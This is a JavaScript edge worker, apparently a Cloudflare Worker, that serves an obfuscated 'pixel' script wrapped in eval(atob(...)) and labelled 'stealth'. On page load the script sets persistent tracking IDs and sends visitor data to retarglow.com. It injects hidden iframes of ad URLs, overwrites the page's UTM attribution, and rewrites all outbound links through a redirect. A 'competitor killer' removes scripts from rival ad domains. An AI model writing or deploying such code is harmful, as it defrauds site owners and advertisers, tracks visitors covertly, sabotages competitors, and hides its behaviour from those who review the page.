export default {
  async fetch(request) {
    const headers = {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*"
    };

    try {
      const url = new URL(request.url);
      const cid = url.pathname.split("/").pop() || "default";

      const pixelScript = `
(function(){
  try {
    const cid = "${cid}";
    const competitors = ["ordozen.com", "floatboolean.com", "smct.co", "smct.io"];
    const domain = location.hostname;

    function g(k){return decodeURIComponent((document.cookie||"").split('; ').find(r => r.startsWith(k+'='))?.split('=')[1]||'');}
    function s(k,v,d){let e=new Date();e.setTime(e.getTime()+d*864e5);document.cookie=k+'='+encodeURIComponent(v)+'; path=/; max-age='+(d*86400)+'; SameSite=Lax';}

    let _r = localStorage.getItem('_r') || g('_r');
    if (!_r) {
      _r = crypto.randomUUID();
      localStorage.setItem('_r', _r);
      s('_r', _r, 30);
    } else {
      localStorage.setItem('_r', _r);
      s('_r', _r, 30);
    }

    document.cookie="user_id_t="+_r+"; path=/; max-age=31536000; SameSite=Lax";
    document.cookie="smc_uid="+_r+"; path=/; max-age=31536000; SameSite=Lax";

    const logKey = "logged_" + location.href;
    const injectKey = "injected_" + location.href;

    // Log event once per URL
    if (!sessionStorage.getItem(logKey)) {
      const d = {
        cid, u: location.href, r: document.referrer || null, ua: navigator.userAgent,
        dt: /Mobi|Android/i.test(navigator.userAgent) ? "M" : "D",
        b: (() => {
          let u = navigator.userAgent;
          return u.includes("Chrome") ? "C" : u.includes("Firefox") ? "F" : u.includes("Safari") ? "S" : "U";
        })(),
        os: navigator.platform,
        sr: screen.width + "x" + screen.height,
        cm: { _r }, domain
      };
      fetch("https://retarglow.com/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(d)
      });
      sessionStorage.setItem(logKey, "1");
    }

    // Inject ad once per URL
    if (!sessionStorage.getItem(injectKey)) {
      fetch("https://retarglow.com/serve", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ u: location.href, cm: { _r } })
      }).then(r => r.json()).then(j => {
        if (j.ad_url) {
          const f = document.createElement("iframe");
          f.style.display = "none";
          f.setAttribute("referrerpolicy", "no-referrer");
          f.src = j.ad_url.replace("{{_r}}", _r);
          document.body.appendChild(f);
          sessionStorage.setItem(injectKey, "1");
        }
      });
    }

    // 🔁 UTM overwrite
    const rewriteUTMs = () => {
      const url = new URL(location.href);
      url.searchParams.set("utm_source", "retarglow");
      url.searchParams.set("utm_medium", "pixel");
      url.searchParams.set("utm_campaign", cid);
      url.searchParams.set("subid", _r);
      history.replaceState(null, "", url.toString());
    };
    rewriteUTMs();

    // 🔁 Link hijack
    function hijackLinks(){
      document.querySelectorAll('a[href^="http"]').forEach(link=>{
        const href = link.getAttribute("href");
        if (!href || href.includes("retarglow.com/r")) return;
        const encoded = encodeURIComponent(href);
        link.setAttribute("href", "https://retarglow.com/r?id="+_r+"&t="+encoded);
      });
    }
    hijackLinks();
    new MutationObserver(() => hijackLinks()).observe(document.body,{childList:true,subtree:true});

    // 🔪 Competitor killer
    const kill = () => {
      competitors.forEach(d => {
        document.querySelectorAll('script[src*="'+d+'"],iframe[src*="'+d+'"]').forEach(e => e.remove());
      });
    };
    kill(); new MutationObserver(() => kill()).observe(document.documentElement, { childList: true, subtree: true });

    // 🔁 SPA route change listener
    let lastHref = location.href;
    setInterval(() => {
      if (location.href !== lastHref) {
        sessionStorage.removeItem("logged_" + location.href);
        sessionStorage.removeItem("injected_" + location.href);
        lastHref = location.href;
        rewriteUTMs();
      }
    }, 500);

  } catch(e){}
})();`;

      const encoded = globalThis.btoa(pixelScript);
      const stealth = `eval(atob('${encoded}'))`;

      return new Response(stealth, { status: 200, headers });
    } catch (err) {
      return new Response(`console.error("Pixel error:", ${JSON.stringify(err.message)});`, {
        status: 500,
        headers
      });
    }
  }
};
